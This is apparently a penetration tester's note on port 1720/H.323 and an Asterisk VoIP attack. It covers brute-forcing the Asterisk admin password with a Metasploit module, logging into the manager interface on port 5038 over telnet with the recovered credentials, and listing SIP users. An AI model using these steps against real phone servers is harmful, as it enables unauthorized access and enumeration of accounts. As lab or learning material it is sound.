# communication
Port 1720:
----------

|     |     |
| --- | --- |
| Name: | **h323hostcall** |
| Purpose: | ![](communication/transpixel.gif)**H.323 (Microsoft NetMeeting) call setup protocol** |
| Description: | ![](communication/transpixel.gif)Port 1720 is used by the H.323 teleconferencing protocol (most commonly encountered in Microsoft NetMeeting) during call setup negotiation. |
| Related Ports: | ![](communication/transpixel.gif)[389](https://www.grc.com/port_389.htm) ,[1002](https://www.grc.com/port_1002.htm) |

H. 323 is the more mature of the two, but problems may arise due to lack of flexibility. SIP is currently less defined, but has greater scalability which could ease internet application integration. 

Searching `asterisk` in msfconsole shows `auxiliary/voip/asterisk_login` module with which we're able to bruteforce the password of `admin`(abc123)

using telnet on port 5038(asterisk call manager):

```text-plain
Action: Login
ActionID: 1
Username: admin
Secret: abc123

Response: Success
ActionID: 1
Message: Authentication accepted
```

Will show authentication accepted, than we type:

```text-plain
action:command
command:sip show users
```